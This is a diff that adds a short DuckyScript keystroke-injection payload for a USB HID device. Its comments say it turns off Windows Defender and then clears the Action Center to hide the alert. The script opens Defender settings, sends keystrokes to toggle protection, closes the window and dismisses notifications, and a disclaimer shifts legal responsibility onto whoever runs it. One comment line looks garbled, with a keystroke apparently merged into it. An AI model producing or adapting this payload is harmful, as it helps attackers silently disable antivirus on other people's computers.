@@ -1,0 +1,27 @@
+REM turn off windows defender then clear action center
+REM You take responsibility for any laws you break with this, I simply point out the security flaw
+REM
+REM start of script
+REM
+REM let the HID enumerate
+DELAY 3000
+ESCAPE
+DELAY 200
+CONTROL ESCAPE
+DELAY 200
+STRING Windows Defender Settings
+ENTER
+DELAY 3000
+REM why TAB and HOME?
+TAB
+DELAY 100
+REM why TAB and HOME?HOME
+DELAY 100
+ALT F4
+DELAY 3500
+REM windows + a = ????
+GUI a
+DELAY 100
+ENTER
+DELAY 200
+GUI a
